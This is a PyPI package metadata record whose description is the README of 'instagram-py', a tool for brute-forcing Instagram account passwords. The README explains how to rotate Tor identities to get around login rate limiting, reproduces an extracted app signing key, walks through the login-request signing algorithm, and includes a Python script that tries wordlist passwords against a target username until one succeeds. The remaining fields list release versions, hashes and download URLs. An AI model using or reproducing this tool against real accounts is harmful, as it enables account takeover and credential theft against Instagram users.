{
  "info": {
    "author": "Antony-Jr",
    "author_email": "antonyjr@protonmail.com",
    "bugtrack_url": null,
    "classifiers": [
      "Natural Language :: English",
      "Operating System :: OS Independent",
      "Programming Language :: Python :: 3.4",
      "Programming Language :: Python :: 3.6",
      "Topic :: Utilities"
    ],
    "description": "==============\r\n Instagram-Py \r\n==============\r\n\r\n    | Instagram-py performs slick brute force attack on Instagram without any type of password limiting\r\n    | and also resumes your attack in ease. \r\n    \r\n    --Antony Jr.\r\n\r\n\r\n------\r\n How?\r\n------\r\n\r\n| We use , **tor** to change our ip once blocked for many tries and continue attack.\r\n| Since the official api is not a hacker wants, So we use the **InstagramAPK signature** to stay **anonymous!**\r\n| And we also **save** the **progress** so that even in network interruption we can avoid breaking the computer!\r\n\r\n **See the 'Algorimthm' section down below for more hackery!**\r\n\r\n-------\r\n What?\r\n-------\r\n\r\n| **Instagram-Py** is a slick python script to perform  **brute force** attack against **Instagram** ,   \r\n| this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.\r\n| Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible\r\n| This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,\r\n| but if your **tor** installation is **misconfigured** then the blame is on you.\r\n\r\n\r\n------------\r\n Features\r\n------------\r\n\r\n* Instagram-Py Scripting\r\n\r\n  Craft your own python script which will embed into Instagram-Py for Maximum Customization of your\r\n  brute force attack , example: What if you want a message sent to your phone when an account is hacked?\r\n\r\n* Resumes Attacks when the same wordlist is used on the same Username\r\n* Dumps successfully cracked accounts.\r\n* Maximum Customization! ( This includes multiple attack vectors! )\r\n* Fast and Clean Code , no ugly selenum drivers! ( Pure Requests )\r\n* Elegant Tor Identity Change with Stem ( Tor's Official Library for Python )\r\n\r\n\r\n**Depends on**: python3 , tor ,  requests , requests[socks] , stem\r\n\r\n==============\r\n Installation\r\n==============\r\n---------------------------------\r\n Upgrading Instagram-Py with pip\r\n---------------------------------\r\n\r\n::\r\n\r\n $ sudo pip3 install instagram-py --upgrade\r\n\r\n\r\n-------------------------------\r\n using pip to get Instagram-py\r\n-------------------------------\r\n\r\n**Make sure you have got the latest version of pip(>= 9.0 and python(>= 3.6)**\r\n\r\n::\r\n\r\n $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip\r\n $ sudo pip3 install requests --upgrade\r\n $ sudo pip3 install requests[socks]\r\n $ sudo pip3 install stem\r\n $ sudo pip3 install instagram-py\r\n $ instagram-py # installed successfully\r\n $ # Configuration is Super Important so Lets Create One\r\n $ instagram-py --create-configuration # follow the steps... \r\n\r\n--------------------------------\r\n    Configuring Instagram-Py\r\n--------------------------------\r\n\r\n**As of v2.0.0 Configuration is Simply done by Passing an Argument to Instagram-Py**\r\n\r\n::\r\n\r\n $ instagram-py --create-configuration\r\n $      # OR\r\n $ instagram-py -cc\r\n\r\n\r\n\r\n**Or if you just want the default settings without the annoying questions then**\r\n\r\n::\r\n\r\n $ instagram-py --create-configuration --default-configuration\r\n $      # OR\r\n $ instagram-py -cc -dc\r\n\r\n\r\n\r\n--------------------------------------------------\r\n    Configuring Tor server to open control port\r\n--------------------------------------------------\r\n\r\nopen your **tor configuration** file usually located at **/etc/tor/torrc**\r\n\r\n\r\n::\r\n \r\n $ sudo vim /etc/tor/torrc # open it with your text editor\r\n \r\n\r\n**search** for the file for this **specific section**\r\n\r\n::\r\n\r\n ## The port on which Tor will listen for local connections from Tor\r\n ## controller applications, as documented in control-spec.txt.\r\n #ControlPort 9051\r\n \r\n**uncomment** 'ControlPort' by deleting the **#** before 'ControlPort' , **now save the file and restart your tor server**\r\n\r\n**now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json** \r\n\r\n=============\r\n    Usage\r\n=============\r\n\r\n**Finally** , now you can use instagram-py!\r\n\r\n**Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!**\r\n\r\n**Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!**\r\n\r\n\r\n::\r\n\r\n $ instagram-py -u your_account_username -pl path_to_password_list\r\n\r\n\r\n**Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**\r\n\r\n::\r\n\r\n usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST]\r\n                     [--script SCRIPT] [--inspect-username INSPECT_USERNAME]\r\n                     [--create-configuration] [--default-configuration]\r\n                     [--countinue] [--verbose]\r\n \r\n optional arguments:\r\n   -h, --help            show this help message and exit\r\n   --username USERNAME, -u USERNAME\r\n                         username for Instagram account\r\n   --password-list PASSWORD_LIST, -pl PASSWORD_LIST\r\n                         password list file to try with the given username.\r\n   --script SCRIPT, -s SCRIPT\r\n                         Instagram-Py Attack Script.\r\n   --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME\r\n                         Username to inspect in the instagram-py dump.\r\n   --create-configuration, -cc\r\n                         Create a Configuration file for Instagram-Py with\r\n                         ease.\r\n   --default-configuration, -dc\r\n                         noconfirm for Instagram-Py Configuration Creator!\r\n   --countinue, -c       Countinue the previous attack if found.\r\n   --verbose, -v         Activate Verbose mode. ( Verbose level )\r\n\r\n example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt\r\n\r\n Report bug, suggestions and new features at https://github.com/antony-jr/instagram-py\r\n\r\n\r\n\r\n========================\r\n Instagram-Py Scripting\r\n========================\r\n\r\nInstagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks.\r\nThis Scripts are simple Python Scripts ( You Can just do anything that is possible with python )\r\n\r\n\r\n**You Can Always View the Cracked Passwords Using this command!**\r\n\r\n::\r\n\r\n $ instagram-py -i instatestgod__\r\n $ # Displays record if it is cracked in the past!\r\n\r\n===========\r\n Algorithm\r\n===========\r\n\r\n**Instagram-Py** uses a very simple algorithm for checking passwords efficiently , this section is dedicated for those who\r\nwish to recreate this program in any other language.\r\n\r\n\r\n**You can see this live when you run the tool in max verbosity**\r\n\r\n::\r\n\r\n $ instagram-py -vvv -u instatestgod__ -pl password_list.lst\r\n\r\n**You can also use Instagram-Py as a module , so that you can also use it in your script**\r\n\r\n-------------\r\n What we do\r\n-------------\r\n\r\n**Step 1:** Get the magic cookie , which is used to verify device integrity!\r\n\r\nGetting the magic cookie is the simplest job , all we need to do is send a get request to **https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=** , where the **guid** get parameter is a random 32 character string.\r\nThe random 32 character string can be generator using python's simple **uuid library** , to be specific **v4** of **UUID**.\r\nSo finally we just have to request the url **https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=800e88b931bf491fa3b4a7afa4e679eb** and get the cookie named **csrftoken** , if we observe the **response header** we\r\ncould see that our cookie only **expires** next **year** the same day. So by this we only have to make this request once\r\nand can use it for a year! How vulnerable is that?... \r\n\r\n\r\n**Step 2:** Build a post request with Instagram's signature.\r\n\r\nThis part is **simple** but may be difficult to setup , first i need to get instagram's signature\r\nwhich is only present in their free apk from google play , Remember our **Strength can be our Weakness**\r\n, All i have to do reverse engineer the apk and find the signature, lets call it **ig_sig**.\r\n\r\n::\r\n \r\n ig_sig = 4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178\r\n ig_version = 4\r\n\r\n**Instagram** uses **HMAC Authentication** for login stuff, so lets use python's **hmac library**.\r\nBut first we have to build our body which will be encoded in json for it to actually sign with \r\n**ig_sig** , So the post **body** looks likes this...\r\n\r\n\r\n::\r\n \r\n phone_id   = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS>\r\n _csrftoken = <THE MAGIC COOKIE THAT WE GOT!>\r\n username   = <TARGET ACCOUNT>\r\n guid       = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS>\r\n device_id  = android-<RANDOM 16 CHARACTER STRING>\r\n password   = <PASSWORD TO TRY>\r\n login_attempt_count = 0\r\n\r\n\r\nThe above will be encoded to **JSON** , So to test the password we have to post the data to this url\r\n**https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=<SIGNED BODY>.<URL ENCODED JSON DATA>** .\r\n\r\n**<SIGNED BODY>:** using **HMAC** , sign our json encoded data with **ig_sig** and return a hexa value.\r\n\r\n**<URL ENCODED JSON DATA>:** the same data in json but we url encode so that it goes properly to insta!\r\n\r\nSo to test a account with username as **USERNAME** and password with **PASSWORD** we simply request this\r\nurl **https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=bc90e1b7d430f39152e92b4e7d517bfb231dbe0515ed2071dc784cf876e301c3.%7B%22phone_id%22%3A%20%2232abb45c-f605-4fd7-9b5e-674115516b90%22%2C%20%22_csrftoken%22%3A%20%22PyMH2niVQrk41UIBW0lKilleG7GylluQ%22%2C%20%22username%22%3A%20%22USERNAME%22%2C%20%22guid%22%3A%20%2267ca220c-a9eb-4240-b173-2d253808904d%22%2C%20%22device_id%22%3A%20%22android-283abce46cb0a0bcef4%22%2C%20%22password%22%3A%20%22PASSWORD%22%2C%20%22login_attempt_count%22%3A%20%220%22%7D** \r\n\r\n**Take a look** how I did it... \r\n\r\n\r\n**Step 3:** With the json response and response code , we determine the password is correct or wrong.\r\n\r\nif **We get response 200** then the login is success but if we get **response 400** , We inspect the\r\n**json data** for clues if it is the **correct password or invalid request or too many tries**.\r\nSo we inspect the **message** from instagram json response!\r\n\r\n**Message = Challenge Required** , then the password is correct but instagram got some questions so\r\nwe must wait until the user logs in and answer the question and if we are lucky they will not change\r\nthe password and we could login in later(**Most of the time people won't change the password!**)\r\n\r\n**Message = The password you entered is incorrect.** , then the password is incorrect for sure , try\r\nanother.\r\n\r\n**Message as something like word invalid in it then** , some other error so just try again, can happen\r\nbecause of wordlist encoding error which i ignored because all the worldlist have encoding error!\r\n\r\n**Message = Too many tries** , Time to change our ip and loop but we don't want to change our magic cookie\r\n\r\n**Thats it you just hacked instagram with a very simple algorithm!**\r\n\r\n\r\n===========================\r\n Using Instagram-Py as API\r\n===========================\r\n\r\n**Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!**\r\n\r\nFor some reason you wish not to use my software then you can use my software as a module and embed into your own\r\nsoftware , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.\r\n\r\n**Follow the same installation method mentioned above to install Instagram-Py API.**\r\n\r\nThis is a simple script to conduct a bructe force attack using instagram-py as a API.\r\n\r\n::\r\n\r\n #!/usr/bin/env python3\r\n '''\r\n   This is the same thing that is in the __init__ file of the command-line\r\n   tool.\r\n '''\r\n from InstagramPy.InstagramPyCLI import InstagramPyCLI\r\n from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH\r\n from InstagramPy.InstagramPyInstance import InstagramPyInstance\r\n from datetime import datetime\r\n \r\n username = \"TARGET ACCOUNT USERNAME\"\r\n password = \"PASSWORD LIST PATH\"\r\n\r\n appInfo = {\r\n    \"version\"     : \"0.0.1\",\r\n    \"name\"        : \"Instagram-Py Clone\",\r\n    \"description\" : \"Some Module to crack instagram!\",\r\n    \"author\"      : \"YourName\",\r\n    \"company\"     : \"YourCompany\",\r\n    \"year\"        : \"2017\",\r\n    \"example\"     : \"\"\r\n }\r\n\r\n cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)\r\n \r\n '''\r\n # USE THIS IF YOU WANT\r\n cli.PrintHeader()\r\n cli.PrintDatetime()\r\n '''\r\n session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)\r\n session.ReadSaveFile(True) # True to countinue attack if found save file.\r\n '''\r\n # USE THIS IF YOU WANT\r\n cli.PrintMagicCookie(session.magic_cookie)\r\n '''\r\n\r\n '''\r\n  Defining @param cli = None will make Instagram-Py run silently so you\r\n  can you use your own interface if you like.\r\n  or if you want to use the official interface then declare like this\r\n\r\n  instagrampy = InstagramPyInstance(cli = cli , session = session)\r\n\r\n '''\r\n\r\n instagrampy = InstagramPyInstance(cli = None ,session = session)\r\n while not instagrampy.PasswordFound():\r\n        print('Trying... '+session.CurrentPassword())\r\n        instagrampy.TryPassword()\r\n\r\n if instagrampy.PasswordFound():\r\n        print('Password Found: '+session.CurrentPassword())\r\n\r\n exit(0) \r\n \r\n\r\n\r\n=============\r\n   License\r\n=============\r\n\r\nThe MIT License,\r\n\r\nCopyright (C) 2018 The Future Shell , Antony Jr.\r\n",
    "docs_url": null,
    "download_url": "https://github.com/antony-jr/instagram-py/archive/v2.0.2.tar.gz",
    "downloads": {
      "last_day": 0,
      "last_month": 0,
      "last_week": 0
    },
    "home_page": "https://github.com/antony-jr/Instagram-Py",
    "keywords": "cli",
    "license": "MIT",
    "maintainer": "",
    "maintainer_email": "",
    "name": "instagram-py",
    "platform": "",
    "project_url": "https://pypi.org/project/instagram-py/",
    "release_url": "https://pypi.org/project/instagram-py/2.0.2/",
    "requires_dist": [],
    "requires_python": "",
    "summary": "Slick Instagram brute force command line tool writen in python.",
    "version": "2.0.2"
  },
  "releases": {
    "0.2.1": [
      {
        "comment_text": "",
        "digests": {
          "md5": "66d33a482c1204e1e837a60c90226bfe",
          "sha256": "c43a03d6a77f5b95a822b39cd04a8dfa4bd2096b7cb4362f52f6d2e80eb587bf"
        },
        "downloads": -1,
        "filename": "instagram-py-0.2.1.tar.gz",
        "has_sig": false,
        "md5_digest": "66d33a482c1204e1e837a60c90226bfe",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 15744,
        "upload_time": "2017-09-12T13:32:51",
        "url": "https://files.pythonhosted.org/packages/98/c7/f5e9cd1124da5f632001861f2ae35b35220e923a9890197842413958d682/instagram-py-0.2.1.tar.gz"
      }
    ],
    "0.3.1": [
      {
        "comment_text": "",
        "digests": {
          "md5": "09989a54d23908ad86bed3462713df38",
          "sha256": "424a55cd66754607ccae2ee0cd63c60961ab8829a112445ef7c2410f1f2ee452"
        },
        "downloads": -1,
        "filename": "instagram-py-0.3.1.tar.gz",
        "has_sig": false,
        "md5_digest": "09989a54d23908ad86bed3462713df38",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 15805,
        "upload_time": "2017-09-12T13:38:46",
        "url": "https://files.pythonhosted.org/packages/40/97/f81f9e2dc05cc54072f322b94c5cf35467c16d55c4c922064f29fa53c714/instagram-py-0.3.1.tar.gz"
      }
    ],
    "0.3.2": [
      {
        "comment_text": "",
        "digests": {
          "md5": "93713a1184b28f8749206f8a91273154",
          "sha256": "8ca373fec6d94fb73351fae83297015fa213248e4d9a81eaccbd4e302d4decfe"
        },
        "downloads": -1,
        "filename": "instagram-py-0.3.2.tar.gz",
        "has_sig": false,
        "md5_digest": "93713a1184b28f8749206f8a91273154",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 15896,
        "upload_time": "2017-09-13T09:29:00",
        "url": "https://files.pythonhosted.org/packages/71/b4/365dd273628546e4bcf2971bdf0cde32544b08c6d3a2e0552d127f883329/instagram-py-0.3.2.tar.gz"
      }
    ],
    "1.3.2": [
      {
        "comment_text": "",
        "digests": {
          "md5": "faccfd4780a0d073faef2bd73a3e9741",
          "sha256": "084125d49027d6f53807bbfa18e4c964d814491e4639acb2d19c731c97fbe81f"
        },
        "downloads": -1,
        "filename": "instagram-py-1.3.2.tar.gz",
        "has_sig": false,
        "md5_digest": "faccfd4780a0d073faef2bd73a3e9741",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 22003,
        "upload_time": "2017-10-12T12:44:08",
        "url": "https://files.pythonhosted.org/packages/f3/44/938f52c6f07d8c184d4a7dd253a6e631a8e5d0dedff91ad52c6bea89f173/instagram-py-1.3.2.tar.gz"
      }
    ],
    "1.3.3": [
      {
        "comment_text": "",
        "digests": {
          "md5": "d7f9d8dcb9a5a970b8f391cbd19b14c1",
          "sha256": "c14357b6ba5cb4fdb99ef4efb54384127ee142fca29f9a6702c592449a3b8cbe"
        },
        "downloads": -1,
        "filename": "instagram-py-1.3.3.tar.gz",
        "has_sig": false,
        "md5_digest": "d7f9d8dcb9a5a970b8f391cbd19b14c1",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 21997,
        "upload_time": "2017-10-12T12:55:04",
        "url": "https://files.pythonhosted.org/packages/3c/2f/31e32b22233aa12852878a22e31c1786fdbf7c143ad4d4f29503da994631/instagram-py-1.3.3.tar.gz"
      }
    ],
    "2.0.0": [
      {
        "comment_text": "",
        "digests": {
          "md5": "175148c9a7a5a82842173769318590a3",
          "sha256": "e08df7dfc1f0689e99b46d07880796b6d78f830910061c2ff7d514b96d3ea7e7"
        },
        "downloads": -1,
        "filename": "instagram-py-2.0.0.tar.gz",
        "has_sig": false,
        "md5_digest": "175148c9a7a5a82842173769318590a3",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 24106,
        "upload_time": "2017-11-18T21:59:16",
        "url": "https://files.pythonhosted.org/packages/f9/ec/b55e6ee87b9d93b225391a90334bf000362cededcc0a894956b0cd1e1e3f/instagram-py-2.0.0.tar.gz"
      }
    ],
    "2.0.1": [
      {
        "comment_text": "",
        "digests": {
          "md5": "bb01efd6facf029e87f951eba9bedf90",
          "sha256": "924fb9c41b4a1cd00b040ced91cbda0a61cce975ad46f0945a43262868729cf4"
        },
        "downloads": -1,
        "filename": "instagram-py-2.0.1.tar.gz",
        "has_sig": false,
        "md5_digest": "bb01efd6facf029e87f951eba9bedf90",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 27427,
        "upload_time": "2017-11-21T17:02:51",
        "url": "https://files.pythonhosted.org/packages/87/85/bb6f950851546cd4509a654b6fca928b1546f6f3ba97471fb5e7545d9b05/instagram-py-2.0.1.tar.gz"
      }
    ],
    "2.0.2": [
      {
        "comment_text": "",
        "digests": {
          "md5": "970eecfb484f4714baa2656e63854d62",
          "sha256": "36fddea0d25d54449006fb90330d5c0f1ab2981109f7c9d5df7a9f7ab9bd7301"
        },
        "downloads": -1,
        "filename": "instagram-py-2.0.2.tar.gz",
        "has_sig": false,
        "md5_digest": "970eecfb484f4714baa2656e63854d62",
        "packagetype": "sdist",
        "python_version": "source",
        "size": 25980,
        "upload_time": "2018-02-01T13:48:56",
        "url": "https://files.pythonhosted.org/packages/f4/48/9840850c3a977a9f08db20792d39123df936781a2e55b1bfe9f4e6f2f08c/instagram-py-2.0.2.tar.gz"
      }
    ]
  },
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "md5": "970eecfb484f4714baa2656e63854d62",
        "sha256": "36fddea0d25d54449006fb90330d5c0f1ab2981109f7c9d5df7a9f7ab9bd7301"
      },
      "downloads": -1,
      "filename": "instagram-py-2.0.2.tar.gz",
      "has_sig": false,
      "md5_digest": "970eecfb484f4714baa2656e63854d62",
      "packagetype": "sdist",
      "python_version": "source",
      "size": 25980,
      "upload_time": "2018-02-01T13:48:56",
      "url": "https://files.pythonhosted.org/packages/f4/48/9840850c3a977a9f08db20792d39123df936781a2e55b1bfe9f4e6f2f08c/instagram-py-2.0.2.tar.gz"
    }
  ]
}